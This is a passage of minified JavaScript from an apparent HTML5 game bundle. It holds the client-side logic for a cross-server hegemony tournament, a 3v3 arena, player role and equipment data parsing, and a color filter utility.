a={index:t.readByte(),id:t.readShort(),server1:t.readInt(),curServer1:t.readInt(),player1:t.readInt(),name1:t.readString(),server2:t.readInt(),curServer2:t.readInt(),player2:t.readInt(),name2:t.readString(),winServer:t.readInt()};this.againstInfo[e][i].push(a)}this.battleTime=o.DateUtils.formatMiniDateTime(t.readUnsignedInt()),this.battleEnd=t.readByte()},e.prototype.postKnockoutReport=function(t){this.knockoutReport=[];for(var e={group:t.readByte(),reportData:[]},i=t.readShort(),n=0;i>n;n++){var o={pos:n+1,serverId:t.readInt(),name:t.readString(),winTimes:t.readShort(),loseTimes:t.readShort()};e.reportData.push(o)}this.knockoutReport.push(e)},e.prototype.postPlayer16Info=function(t){this.player16Info=[];for(var e={group:t.readByte(),playerData:[]},i=t.readShort(),n=0;i>n;n++){var o={pos:n+1,serverId:t.readInt(),name:t.readString(),winTimes:t.readShort(),loseTimes:t.readShort(),winRound:t.readShort(),loseRound:t.readShort(),power:t.readUnsignedInt()};e.playerData.push(o)}this.player16Info.push(e)},e.prototype.postChampion=function(t){this.championNO=t.readShort(),this.championGroup=t.readByte(),this.championServerId=t.readInt(),this.championPlayer=t.readInt(),this.curServerId=t.readInt(),this.championInfoDic[this.championPlayer]||(this.championInfoDic[this.championPlayer]={playerId:this.championPlayer,data:null})},e.prototype.postCurRound=function(t){this.state=t.readByte(),this.curRound=t.readByte(),1==this.curRound&&(this.list=[],this.fightList=[])},e.prototype.postFightInfo=function(t){this.server1=t.readInt(),this.role1=t.readInt(),this.roleName1=t.readString(),this.roleSex1=[t.readByte(),t.readByte(),t.readByte()],this.server2=t.readInt(),this.role2=t.readInt(),this.roleName2=t.readString(),this.roleSex2=[t.readByte(),t.readByte(),t.readByte()]},e.prototype.postServerInfo=function(t){this.roleNo=t.readShort();var e=t.readByte();if(1==e)this.roleServer=t.readInt(),this.roleId=t.readInt(),this.roleName=t.readString(),this.roleJob=t.readByte(),this.roleSex=t.readByte();else{this.serverData=[];for(var i=0;e>i;i++){var n={server:t.readInt(),player:t.readInt(),name:t.readString(),job:t.readByte(),sex:t.readByte()};this.serverData.push(n)}}},e.prototype.sendSignup=function(){this.sendBaseProto(2)},e.prototype.sendPoll=function(){this.sendBaseProto(3)},e.prototype.sendVote=function(t){var e=this.getBytes(4);e.writeInt(t),this.sendToServer(e)},e.prototype.sendChallenge=function(){this.sendBaseProto(5)},e.prototype.sendBetData=function(){this.sendBaseProto(6)},e.prototype.sendBet=function(t,e,i,n){var o=this.getBytes(7);o.writeByte(t),o.writeShort(e),o.writeInt(i),o.writeInt(n),this.sendToServer(o)},e.prototype.sendWorship=function(t){var e=this.getBytes(9);e.writeShort(t),this.sendToServer(e)},e.prototype.sendBuyItem=function(t,e){var i=this.getBytes(11);i.writeShort(t),i.writeInt(e),this.sendToServer(i)},e.prototype.sendKnockoutData=function(){this.sendBaseProto(16)},e.prototype.sendWarData=function(t,e,i){var n=this.getBytes(17);n.writeShort(t),n.writeByte(e),n.writeShort(i),this.sendToServer(n)},e.prototype.sendAgainst=function(t,e){var i=this.getBytes(18);i.writeShort(t),i.writeByte(e),this.sendToServer(i)},e.prototype.sendKnockoutReport=function(t){var e=this.getBytes(19);e.writeByte(t),this.sendToServer(e)},e.prototype.sendPlayerInfo=function(t){var e=this.getBytes(20);e.writeByte(t),this.sendToServer(e)},e.prototype.sendChampionInfo=function(t,e){var i=this.getBytes(21);i.writeShort(t),i.writeByte(e),this.sendToServer(i)},e.prototype.sendServerId=function(t,e){var i=this.getBytes(24);i.writeShort(t);var n=e.length;i.writeByte(n);for(var o=0;n>o;o++)i.writeInt(e[o]);this.sendToServer(i)},e.prototype.isOpen=function(t){void 0===t&&(t=!1);var e=h.OpenSystem.ins().checkSysOpen(r.SystemType.Hegemony);if(!e)return t&&p.TipsCT.ins().showTips(h.OpenSystem.ins().getNoOpenTips(r.SystemType.Hegemony)),!1;var i="",n=a.GlobalConfig.LfRaceBase;return d.ZsCT.ins().lv<n.needZsLv&&(i=gettext("{0}转开启",n.needZsLv)),u.GameServerCC.serverOpenDay+1<n.openDay&&(i=gettext("开服{0}天开启",n.openDay)),t&&""!=i&&p.TipsCT.ins().showTips(i),""==i},e.prototype.getRemainTime=function(){var t=Math.floor((this.openTime-u.GameServerCC.serverTime)/1e3),e=Math.floor((this.endTime-u.GameServerCC.serverTime)/1e3),i="";return 0>t&&e>0&&(i=o.DateUtils.getFormatBySecond(e,o.DateUtils.TIME_FORMAT_5,3)),i},e.prototype.calcWinNum=function(){var t=0;if(this.knockoutInfo&&this.knockoutInfo[0])for(var e=0,i=this.knockoutInfo[0].knockoutData;e<i.length;e++){var n=i[e];n.isWin&&t++}return t},__decorate([post()],e.prototype,"postInit",null),__decorate([post()],e.prototype,"postSignup",null),__decorate([post()],e.prototype,"postPoll",null),__decorate([post()],e.prototype,"postVote",null),__decorate([post()],e.prototype,"postChallenge",null),__decorate([post()],e.prototype,"postBetData",null),__decorate([post()],e.prototype,"postOneBetData",null),__decorate([post()],e.prototype,"postInitWorship",null),__decorate([post()],e.prototype,"postWorship",null),__decorate([post()],e.prototype,"postInitShop",null),__decorate([post()],e.prototype,"postHegemonyShop",null),__decorate([post()],e.prototype,"postRoundEnd",null),__decorate([post()],e.prototype,"postFightEnd",null),__decorate([post()],e.prototype,"postCountdown",null),__decorate([post()],e.prototype,"postState",null),__decorate([post()],e.prototype,"postKnockoutData",null),__decorate([post()],e.prototype,"postWarReport",null),__decorate([post()],e.prototype,"postAgainst",null),__decorate([post()],e.prototype,"postKnockoutReport",null),__decorate([post()],e.prototype,"postPlayer16Info",null),__decorate([post()],e.prototype,"postChampion",null),__decorate([post()],e.prototype,"postCurRound",null),__decorate([post()],e.prototype,"postFightInfo",null),__decorate([post()],e.prototype,"postServerInfo",null),e}(s.BaseSystem);e.HegemonyCT=c,window.HegemonyCT=c,__reflect(c.prototype,"HegemonyCT",[]);var f;!function(t){t[t.None=0]="None",t[t.SignUp=1]="SignUp",t[t.Vote=2]="Vote",t[t.Challenge=3]="Challenge",t[t.Knockout=4]="Knockout",t[t.Prom16=5]="Prom16",t[t.Prom8=6]="Prom8",t[t.Prom4=7]="Prom4",t[t.Finals=8]="Finals",t[t.Over=9]="Over"}(f=e.HegemonyStatus||(e.HegemonyStatus={})),window.HegemonyStatus=f,Systemap.HegemonyCT=function(){return c.ins()},window.HegemonyCT=c},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.KfArenaSys=void 0;var n=i(18),o=i(8),s=i(14),a=i(37),r=i(0),l=i(15),h=i(4),u=i(20),p=i(30),d=i(32),c=i(23),f=i(136),g=i(300),m=i(12),v=i(7),y=i(2),C=i(187),T=i(301),b=i(302),w=i(650),I=i(303),_=i(304),S=i(652),x=i(53),D=i(100),A=i(160),k=function(t){function e(){var e=t.call(this)||this;return e.lastKFArena=!1,e.times=0,e.duanLevel=0,e.score=0,e.leaderID=0,e.inviteDataList=[],e.worldTimeCd=0,e.flagHandle=10011010110,e.flagCD=0,e.ownScore=0,e.ownBattleRank=0,e.dflCount=0,e.openLeftTime=0,e._openTimer=0,e.isStartIng=0,e.isServerOpen=!1,e._collectStatus=0,e.collectOwnerHandle=0,e.sysId=PackageID.KfArena,e.regNetMsg(1,e.postPlayerInfo),e.regNetMsg(2,e.postTeamInfo),e.regNetMsg(5,e.postReceiveInvitation),e.regNetMsg(7,e.postBack),e.regNetMsg(9,e.postRefFlag),e.regNetMsg(10,e.doCollectFlag),e.regNetMsg(13,e.postFbInfo),e.regNetMsg(14,e.doResult),e.regNetMsg(16,e.postMacthState),e.regNetMsg(17,e.postChangeScore),e.regNetMsg(19,e.postDataInfo),e.regNetMsg(20,e.postKfArenaGuilds),e.regNetMsg(21,e.doNotice),e.regNetMsg(22,e.postMyBattleInfo),e.regNetMsg(23,e.postJoinRewards),e.regNetMsg(26,e.postOpenKfArena),e.regNetMsg(25,e.postRank),observe(e,e.changeScene,Ts.enterScene.enterOK),e}return __extends(e,t),e.prototype.resetScore=function(){this._scoreA=this._scoreB=0,this.startTime=void 0},Object.defineProperty(e.prototype,"scoreA",{get:function(){return console.warn("获取到的scoreA",this._scoreA),this._scoreA?this._scoreA:0},set:function(t){this._scoreA=t},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"scoreB",{get:function(){return console.warn("获取到的scoreB",this._scoreB),this._scoreB?this._scoreB:0},set:function(t){this._scoreB=t},enumerable:!1,configurable:!0}),e.ins=function(){return t.ins.call(this)},e.prototype.checkFunIsOpen=function(){return m.OpenSystem.ins().checkSysOpen(l.SystemType.KF3v3)},Object.defineProperty(e.prototype,"collectStatus",{get:function(){return this._collectStatus},set:function(t){this._collectStatus=t,2==t&&this.sendCollectFlag()},enumerable:!1,configurable:!0}),e.prototype.postShowMapCenter=function(){var t=D.mainfightcc.gridToX(r.GlobalConfig.CrossArenaBase.flagPos.posX),e=D.mainfightcc.gridToY(r.GlobalConfig.CrossArenaBase.flagPos.posY);return{x:t,y:e}},e.prototype.checkIsFriend=function(t){return this.myCampId==t},e.prototype.sendCreateTeam=function(){this.sendBaseProto(1)},e.prototype.postPlayerInfo=function(t){this.times=t.readInt(),this.duanLevel=t.readInt(),this.score=t.readInt(),this.curMouth||(this.curMouth=new w.kfArenaMark),this.curMouth.parse(t),this.history||(this.history=new w.kfArenaMark),this.history.parse(t),this.isServerOpen=1==t.readInt()},e.prototype.sendPersonalMatch=function(){this.sendBaseProto(2)},e.prototype.postTeamInfo=function(t){this.leaderID=t.readInt(),this.macthState=t.readInt();var e=t.readInt();this.tfMembers=[];for(var i=0;e>i;i++){var n=new w.KfArenaRoleVo;this.tfMembers[i]=n,n.parse(t)}this.isTFCaptain=h.ActorCC.actorID==this.leaderID},e.prototype.sendLeaveTeam=function(){this.sendBaseProto(3)},e.prototype.sendStartMacth=function(){this.sendBaseProto(4)},e.prototype.sendCancelMacth=function(){this.sendBaseProto(16)},e.prototype.sendGuilds=function(t){var e=this.getBytes(20);e.writeInt(t),this.sendToServer(e)},e.prototype.sendInvite=function(t){var e=this.getBytes(5);e.writeInt(t),this.sendToServer(e),this.postKfArenaDelID(t)},e.prototype.postKfArenaDelID=function(t){return t},e.prototype.postReceiveInvitation=function(t){var e=new I.KFInviteData;e.parse(t),this.checkInviteByID(e.roleId)||this.inviteDataList.push(e),this.inviteDataList.length>0&&win.open(S.kfReceiveInviteWin,this.inviteDataList[this.inviteDataList.length-1])},e.prototype.checkInviteByID=function(t){for(var e=0;e<this.inviteDataList.length;e++)if(this.inviteDataList[e].roleId==t)return!0;return!1},e.prototype.sendWorldInvite=function(){this.sendBaseProto(6)},e.prototype.sendRespondInvite=function(t,e){var i=this.getBytes(7);i.writeInt(t),i.writeInt(e),this.sendToServer(i)},e.prototype.postBack=function(t){var i=t.readInt();switch(i){case 1:win.close(S.kfReceiveInviteWin),e.ins().inviteDataList=[],win.open(A.PlayWayWin,A.PlayWayPage.KfArena3v3);break;case 0:this.postCheckHasOtherInviteInfo()}},e.prototype.postCheckHasOtherInviteInfo=function(){},e.prototype.postMacthState=function(t){this.macthState=t.readInt()},e.prototype.postKfArenaGuilds=function(t){var e=t.readInt(),i=t.readInt();if(e==I.KFInviteType.Guild){this.guildDataList=[];for(var n=0;i>n;n++){var o=new f.GuildMemberInfo;o.parse(t),this.guildDataList.push(o)}}else if(e==I.KFInviteType.Friend){this.friendsDataList=[];for(var n=0;i>n;n++){var o=new f.GuildMemberInfo;o.parse(t),this.friendsDataList.push(o)}}return e},e.prototype.getDataList=function(t){var e,i=[];if(e=t==I.KFInviteType.Friend?this.friendsDataList:this.guildDataList,!e)return i;for(var n=0,o=e;n<o.length;n++){var s=o[n];if(s.roleID!=h.ActorCC.actorID){var a=new f.GuildMemberInfo;a.copyData(s),i.push(a)}}return i},e.prototype.sendJoinTeam=function(t){var e=this.getBytes(18);e.writeInt(t),this.sendToServer(e)},e.prototype.sendOutTeam=function(t){var e=this.getBytes(8);e.writeInt(t),this.sendToServer(e)},e.prototype.postRefFlag=function(t){t.readDouble();this.flagCD=1e3*t.readInt()+egret.getTimer(),this.flagHandle=10011010110},e.prototype.doCollectFlag=function(t){var e=t.readDouble();this.collectOwnerHandle=e;var i=t.readInt();this.firstCollect=t.readBoolean(),this.collectCamp=t.readByte(),i||(this.collectCamp=0),e&&e==h.ActorCC.handle&&i?(win.open(C.CollectWin,e,i),c.GameLogic.ins().currAttackHandle=0):(this.collectStatus=0,win.close(C.CollectWin),x.ControlCC.setAuto(!0))},e.prototype.sendCollectFlag=function(){this.sendBaseProto(10)},e.prototype.postFbInfo=function(t){t.readInt();var e=t.readInt();this.endTime=o.DateUtils.formatMiniDateTime(e),this.myCampId=t.readByte(),this.scoreA=t.readInt(),this.scoreB=t.readInt(),console.error("postFbInfo,",this.scoreA,this.scoreB),this.readyIndex=t.readByte();var i=this.startTime;return{startTime:i,endTimeStamp:e}},e.prototype.postFbInfo1=function(t){this.startTime=t>0?o.DateUtils.formatMiniDateTime(t):t},e.prototype.doResult=function(t){var e=t.readInt(),i=t.readInt();this.winCamp=t.readShort();for(var n=t.readShort(),o=[],s=0;n>s;s++){var a=new T.KfArenaData(t);a.rank=s+1,o.push(a)}var r=[];n=t.readShort();for(var s=0;n>s;s++){var l=new p.RewardData;l.type=t.readInt(),l.id=t.readInt(),l.count=t.readInt(),r.push(l)}win.open(_.KfArenaResultWin,this.winCamp,e,i,o,r,1)},e.prototype.enterBattle=function(){this.sendBaseProto(15)},e.prototype.postChangeScore=function(t){this.scoreA=t.readInt(),this.scoreB=t.readInt()},e.prototype.postDataInfo=function(t){this.dataList=[];for(var e=t.readShort(),i=0;e>i;i++){var n=new T.KfArenaData;n.readRankData(t),n.rank=i+1,this.dataList.push(n)}return this.dataList},e.prototype.sendDataInfo=function(){this.sendBaseProto(19)},e.prototype.doNotice=function(t){var e=t.readString();win.open(g.NoticeView).showNotice(e)},e.prototype.postMyBattleInfo=function(t){this.ownScore=t.readShort(),this.ownBattleRank=t.readShort()},e.prototype.postRank=function(t){this.rankDataList=[];for(var e=t.readInt(),i=0;e>i;i++)this.rankDataList.push(new b.KfArenaRankData(t));this.ownRank=t.readInt()},e.prototype.sendRank=function(){this.sendBaseProto(25)},e.prototype.sendDailyRewards=function(){this.sendBaseProto(23)},e.prototype.sendJoinRewards=function(t){var e=this.getBytes(24);e.writeInt(t),this.sendToServer(e)},e.prototype.postJoinRewards=function(t){this.yesterdayDuan=t.readInt(),this.dailyState=t.readInt(),this.dflCount=t.readInt(),this.dflState=t.readInt()},e.prototype.postOpenKfArena=function(t){this.isStartIng=t.readInt(),this.openLeftTime=t.readInt(),this._openTimer=egret.getTimer(),this.actEndTime=v.GameServerCC.serverTime+1e3*this.openLeftTime,this.openLeftTime>0?Timer.has(this.timeHanlder,this)||Timer.start(1e3,0,this.timeHanlder,this):Timer.stop(this.timeHanlder,this)},e.prototype.timeHanlder=function(){var t=this.getOpenLeftTime();0>=t&&this.postKfArenaEnd()},e.prototype.postKfArenaEnd=function(){},e.prototype.getOpenLeftTime=function(){return this.openLeftTime-(egret.getTimer()-this._openTimer)/1e3},e.prototype.getIsNoOnline=function(){for(var t="",e=0,i=this.tfMembers;e<i.length;e++){var n=i[e];n.isonline||(t+=""==t?n.roleName:"、"+n.roleName)}return t},e.prototype.getWinRate=function(){var t;return t=this.curMouth.win/(this.curMouth.win+this.curMouth.fail+this.curMouth.ping)*100,(t>>0)+"%"},e.prototype.checkIsMatching=function(){return 1==e.ins().macthState?(y.TipsCT.ins().showTips(gettext("跨服竞技场匹配中暂不能操作")),!1):!0},e.prototype.checkFBOperat=function(t){void 0===t&&(t=!1),t&&this.collectCamp&&this.collectCamp==this.myCampId&&y.TipsCT.ins().showTips(gettext("当前有队友正在采集！"));var e=(this.startTime-v.GameServerCC.serverTime)/o.DateUtils.MS_PER_SECOND>>0;return e>0&&y.TipsCT.ins().showTips(gettext("|C:{0}&T:{1}秒后战场开始|",n.ColorUtil.RED,e)),0>=e},e.prototype.getIsJoinTeam=function(){return 0!=this.leaderID},Object.defineProperty(e.prototype,"isKFArena",{get:function(){return u.GameMap.fbType==d.FbCT.FB_TYPE_KF_ARENA},enumerable:!1,configurable:!0}),e.prototype.changeScene=function(){this.isKFArena?(this.lastKFArena=!0,this.updataModel(),this.postShowFightPanel(!0),this.posFlusFightInfo()):this.lastKFArena&&(this.lastKFArena=!1,this.flagHandle=0,this.ownScore=0,this.ownBattleRank=0,this.postShowFightPanel(!1),this.postHideFightPanel(),this.updataModel())},e.prototype.posFlusFightInfo=function(){var t=this.startTime;return{startTime:t,endTimeStamp:this.endTime}},e.prototype.postShowFightPanel=function(t){return t},e.prototype.postHideFightPanel=function(){},e.prototype.updataModel=function(){var t=a.EntityManager.ins().getAllEntity();for(var e in t){var i=t[e];i&&i.updateModel()}},e.prototype.getDuanAwards=function(){var t=r.GlobalConfig.CrossArenaBase.everyDayAward;for(var e in t)if(t[e].metal==this.yesterdayDuan)return p.RewardData.objectsToRewardDatas(t[e].award);return null},e.prototype.getDuanName=function(t){return void 0===t&&(t=0),t?r.GlobalConfig.CrossArenaBase.scoreMetalName[t-1]:r.GlobalConfig.CrossArenaBase.scoreMetalName[this.duanLevel-1]},e.prototype.getDuanName1=function(t){void 0===t&&(t=0);var e=["青铜一段","青铜二段","青铜三段","白银一段","白银二段","白银三段","黄金一段","黄金二段","黄金三段","铂金一段","铂金二段","铂金三段","钻石一段","钻石二段","钻石三段","霸主一段","霸主二段","霸主三段","至尊一段","至尊二段","至尊三段"];return t?e[t-1]:e[this.duanLevel-1]},e.prototype.getActorIdByName=function(t){for(var e=0,i=this.dataList;e<i.length;e++){var n=i[e];if(n.playerName==t)return n.actorid}return 0},e.prototype.checkShowEnter=function(){var t=0;return!e.ins().isOpen()||u.GameMap.checkIsInKf3v3()?t=0:0==e.ins().isStartIng&&e.ins().openLeftTime>0?1:1==e.ins().isStartIng?2:0},e.prototype.isOpen=function(){if(!this.isServerOpen)return!1;var t=m.OpenSystem.ins().checkSysOpen(l.SystemType.KF3v3);return t&&(1==this.isStartIng||0==this.isStartIng&&this.openLeftTime>0)?!0:!1},__decorate([post()],e.prototype,"postShowMapCenter",null),__decorate([post()],e.prototype,"postPlayerInfo",null),__decorate([post()],e.prototype,"postTeamInfo",null),__decorate([post()],e.prototype,"postKfArenaDelID",null),__decorate([post()],e.prototype,"postReceiveInvitation",null),__decorate([post()],e.prototype,"postBack",null),__decorate([post()],e.prototype,"postCheckHasOtherInviteInfo",null),__decorate([post()],e.prototype,"postMacthState",null),__decorate([post()],e.prototype,"postKfArenaGuilds",null),__decorate([post()],e.prototype,"postRefFlag",null),__decorate([post()],e.prototype,"postFbInfo",null),__decorate([post()],e.prototype,"postFbInfo1",null),__decorate([post()],e.prototype,"postChangeScore",null),__decorate([post()],e.prototype,"postDataInfo",null),__decorate([post()],e.prototype,"postMyBattleInfo",null),__decorate([post()],e.prototype,"postRank",null),__decorate([post()],e.prototype,"postJoinRewards",null),__decorate([post()],e.prototype,"postOpenKfArena",null),__decorate([post()],e.prototype,"postKfArenaEnd",null),__decorate([post()],e.prototype,"posFlusFightInfo",null),__decorate([post()],e.prototype,"postShowFightPanel",null),__decorate([post()],e.prototype,"postHideFightPanel",null),e}(s.BaseSystem);e.KfArenaSys=k,window.KfArenaSys=k,__reflect(k.prototype,"KfArenaSys",[]),Systemap.KfArenaSys=function(){return k.ins()},window.KfArenaSys=k},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.Role=void 0;var n=i(34),o=i(145),s=i(0),a=i(40),r=i(154),l=i(96),h=i(62),u=i(140),p=i(139),d=i(28),c=i(173),f=i(38),g=i(222),m=i(712),v=i(158),y=i(102),C=i(4),T=i(13),b=i(10),w=i(351),I=i(105),_=i(226),S=i(713),x=function(t){function e(){var e=t.call(this)||this;return e.suitData=[],e.runeDatas=[],e.kingEquipItemData=[],e.sacrificeArr=[],e.masterEquipDatas=[],e.wingSkillData=[],e.hlPower=0,e.outward=0,e.head=0,e.teamId=0,e.campModel=I.CampMode.PWACE,e.type=EntityType.Role,e}return __extends(e,t),e.getAttrTypeByName=function(t){return this.translate[t]},e.getJobNameByJob=function(t){return this.jobNumberToName[t]},e.getEquipNameByType=function(t){return this.typeNumberToName[t]},Object.defineProperty(e,"typeNumberToNameLen",{get:function(){return this.typeNumberToName.length},enumerable:!1,configurable:!0}),e.getAllForgeLevelByType=function(t){for(var e=0,i=T.SubRoles.ins().subRolesLen,n=0;i>n;n++)for(var o=T.SubRoles.ins().getSubRoleByIndex(n).equipsData,s=0;s<f.EquipCT.FOEGE_MAX;s++)switch(t){case PackageID.strongthen:e+=o[s].strengthen;break;case PackageID.Gem:e+=o[s].gem;break;case PackageID.Zhuling:e+=o[s].zhuling}return e},e.prototype.parser=function(t){this.title=t.readInt(),this.index=t.readInt(),this.job=t.readInt(),this.sex=t.readInt(),this.power=t.readDouble();var e;this.equipsData=[];var i;for(e=0;e<h.EquipPos.MAX;e++)i=new g.EquipsData,i.parser(t),this.equipsData.push(i);this.jingMaiData=new m.JingMaiData,this.jingMaiData.parser(t),this.parserRune(t),this.parserhHeirloom(t),this.parserhMasterEquip(t),this.skillsData=[];var n=t.readInt();for(e=0;n>e;e++){var o=t.readInt(),s=t.readInt(),a=t.readInt();this.skillsData.push(v.SkillData.getSkillByJob(this.job,e+1,o+a,s))}this.parserAtt(t),this.outward=t.readInt(),this.head=t.readInt(),this.parserhEquipSacrifice(t),this.longGasID=t.readUnsignedByte(),this.godCrownID=t.readByte(),this.wingsData=new S.WingsData,this.setWingSkill()},e.prototype.parserRune=function(t){var e=8,i=null;this.runeDatas=[];for(var n=0;e>n;n++)i=new a.ItemData,i.parser(t),this.runeDatas.push(i)},e.prototype.parseForgeChange=function(t,e){var i=t.readInt();switch(e){case PackageID.strongthen:this.equipsData[i].strengthen=t.readInt();break;case PackageID.Gem:this.equipsData[i].gem=t.readInt();break;case PackageID.Zhuling:this.equipsData[i].zhuling=t.readInt();break;case PackageID.Tupo:this.equipsData[i].tupo=t.readInt();break;case 1100:this.equipsData[i].bless=t.readInt()}return i},e.prototype.parserOtherRole=function(t,e){this.parserAtt(t),this._name=t.readString(),e&&(this._servId=t.readInt()),this.job=t.readByte(),this.sex=t.readByte(),this._lv=t.readInt(),this.wingID=t.readString(),this.titleID=t.readString(),this.guildID=t.readInt(),this.guildName=t.readString(),this.camp=t.readShort(),this.outward=t.readInt(),this.teamId=t.readInt(),this.campModel=t.readByte();var i=t.readShort();this.suitData=[];for(var n=0;i>n;n++){var o=t.readInt();this.suitData.push(o)}this.demonCirID=t.readByte(),this.warsoulID=t.readInt(),this.warsoulID?this.warsoulLV=t.readShort():this.warsoulLV=0,this.longGasID=t.readUnsignedByte(),this.godCrownID=t.readByte()},e.prototype.kingEquipItemList=function(t){for(var e=10,i=0;e>i;i++){var n=new a.ItemData;n.parser(t),this.kingEquipItemData[i]=n}},e.prototype.getMinEquipIndexByType=function(t){for(var e=0,i=Number.MAX_VALUE,n=0,o=u.ForgeConst.CAN_FORGE_EQUIP.length,a=0;o>a;++a){var r=u.ForgeConst.CAN_FORGE_EQUIP[a];switch(t){case p.ForgeWin.Page_Select_Boost:n=this.equipsData[r].strengthen;break;case p.ForgeWin.Page_Select_Gem:n=this.equipsData[r].gem;var l=s.GlobalConfig.StoneOpenConfig[r];if(C.ActorCC.level<l.openLv)continue;break;case p.ForgeWin.Page_Select_ZhuLing:n=this.equipsData[r].zhuling;break;case 3:n=this.equipsData[r].tupo}i>n&&(i=n,e=r)}return e},e.prototype.getEquipForgeTotalLv=function(t){for(var e=0,i=u.ForgeConst.CAN_FORGE_EQUIP.length;i--;){var n=u.ForgeConst.CAN_FORGE_EQUIP[i];switch(t){case p.ForgeWin.Page_Select_Boost:e+=this.getEquipByIndex(n).strengthen;break;case p.ForgeWin.Page_Select_Gem:e+=this.getEquipByIndex(n).gem;break;case p.ForgeWin.Page_Select_ZhuLing:e+=this.getEquipByIndex(n).zhuling;break;case 3:e+=this.getEquipByIndex(n).tupo}}return e},e.prototype.getEquipForgeLv=function(t,e){var i=0;switch(e){case p.ForgeWin.Page_Select_Boost:i+=this.getEquipByIndex(t).strengthen;break;case p.ForgeWin.Page_Select_Gem:i+=this.getEquipByIndex(t).gem;break;case p.ForgeWin.Page_Select_ZhuLing:i+=this.getEquipByIndex(t).zhuling;break;case 3:i+=this.getEquipByIndex(t).tupo}return i},e.prototype.mergeData=function(t){return this.masterHandle=t.masterHandle,this.handle=t.handle,this.type=t.type,this.x=t.x,this.y=t.y,this.attributeData=t.attributeData,this.name=t.name,this.guildID=t.guildID,this.guildName=t.guildName,t.isMy&&(this.isMy=t.isMy),this.title=t.title,this},e.prototype.getEquipDataByPos=function(t){return this.equipsData&&this.equipsData[t]?this.equipsData[t]:null},e.prototype.getForgeTotalPower=function(t){for(var e=0,i=u.ForgeConst.CAN_FORGE_EQUIP.length;i--;){var n=u.ForgeConst.CAN_FORGE_EQUIP[i],o=void 0;switch(t){case p.ForgeWin.Page_Select_Boost:o=this.equipsData[n].strengthen;break;case p.ForgeWin.Page_Select_ZhuLing:o=this.equipsData[n].zhuling;break;case p.ForgeWin.Page_Select_Gem:o=this.equipsData[n].gem;break;case 3:o=this.equipsData[n].tupo}if(o>0){var s=l.ForgeCT.ins().getForgeConfigByPos(n,o,t);e+=Math.floor(b.ItemUtil.getAttrPower(s.attr))}}return e},Object.defineProperty(e.prototype,"name",{get:function(){return this._name},set:function(t){this._name=t},enumerable:!1,configurable:!0}),e.prototype.getNameWithServer2=function(){return this._servShowId&&y.KFServerSys.ins().isKF?this.name+("\nS"+this._servShowId):this.name},Object.defineProperty(e.prototype,"guildAndName",{get:function(){var t,e=this.getNameWithServer(),i="";r.BattleCC.ins().isBattle()&&(i="#00FF00",t=r.BattleCC.ins().camp);var n=!this.isMy&&this.camp>0&&i?this.camp!=t?"#FF0000":i:null,o=0==this.guildID||void 0==this.guildID?e:"<font color='"+(n?n:this.guildID==c.GuildWar.ins().getModel().winGuildInfo.guildId?"#ffb243":this.guildID==d.Guild.ins().guildID?"#5add70":"#2CC2F8")+"}'>"+this.guildName+"</font>\n"+this.name;return o},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"lv",{get:function(){return this._lv},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"servId",{get:function(){return this._servId},enumerable:!1,configurable:!0}),e.prototype.parserhHeirloom=function(t){this.heirloom||(this.heirloom=new w.HeirloomData),this.heirloom.parser(t)},e.prototype.getHeirloomSlotPower=function(t){var e=this.heirloom.getInfoBySolt(t),i=b.ItemUtil.getAttrPower(e.attr)||0,n=(e.attr_add,0),o=this.getEquipByIndex(t);if(o.item.itemConfig){n+=o.item.point;for(var s=0;3>s;s++){var a=this.getEquipForgeLv(t,s),r=l.ForgeCT.ins().getForgeConfigByPos(t,a,s);n+=b.ItemUtil.getAttrPower(null===r||void 0===r?void 0:r.attr)||0
}}var h=i+n;return h},e.prototype.parserhEquipSacrifice=function(t){for(var e=t.readByte(),i=0;e>i;i++){var n=t.readByte(),o=t.readByte(),s=t.readByte(),a=new _.EquipSacrificeData;a.pos=n,a.lv=o;for(var r=0;s>r;r++){var l=new _.EquipSacrificeAttData;l.attIndex=t.readByte(),l.attType=t.readInt(),l.attValue=t.readInt(),a.attArr.push(l)}this.sacrificeArr[n+""]=a}},e.prototype.parserhMasterEquip=function(t){var e=4,i=null;this.masterEquipDatas=[];for(var n=0;e>n;n++)i=new a.ItemData,i.parser(t),this.masterEquipDatas.push(i)},e.prototype.getEquipByIndex=function(t){var e;return null===(e=this.equipsData)||void 0===e?void 0:e[t]},e.prototype.getEquipLen=function(){return this.equipsData.length},e.prototype.getHpState=function(){var e=t.prototype.getHpState.call(this),i=this.getAtt(n.AttributeType.maxNeiGong);return e+(i>0?2:1)},e.prototype.isWearEquip=function(t){for(var e=0;e<this.equipsData.length;e++)if(this.equipsData[e].item&&this.equipsData[e].item.configID&&this.equipsData[e].item.handle==t)return!0;return!1},e.prototype.getPosByhandel=function(t){for(var e=0;e<this.equipsData.length;e++){var i=this.equipsData[e];if(i.item.handle==t)return e}return-1},e.prototype.setWingSkill=function(){this.wingSkillData=[];for(var t=0;t<this.wingsData.lv+1;t++){var e=s.GlobalConfig.WingLevelConfig[t];e&&e.pasSkillId&&this.wingSkillData.push(e.pasSkillId)}},e.prototype.getMasterEquipByIndex=function(t){var e;return null===(e=this.masterEquipDatas)||void 0===e?void 0:e[t]},e.jobNumberToName={},e.translate={hp:n.AttributeType.atMaxHp,atkMin:n.AttributeType.atAtkMin,atkMax:n.AttributeType.atAtkMax,mageMin:n.AttributeType.atAtkMageMin,mageMax:n.AttributeType.atAtkMageMax,taoistMin:n.AttributeType.atAtkTaoistMin,taoistMax:n.AttributeType.atAtkTaoistMax,def:n.AttributeType.atDef,res:n.AttributeType.atRes,crit:n.AttributeType.atCrit},e.typeNumberToName=[],e}(o.EntityModel);e.Role=x,window.Role=x,__reflect(x.prototype,"Role",[]),window.Role=x},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.FilterUtil=void 0;var n=function(){function t(){}return Object.defineProperty(t,"grayFilter",{get:function(){return new egret.ColorMatrixFilter([.3,.6,0,0,0,.3,.6,0,0,0,.3,.6,0,0,0,0,0,0,1,0])},enumerable:!1,configurable:!0}),Object.defineProperty(t,"grayFilter1",{get:function(){return new 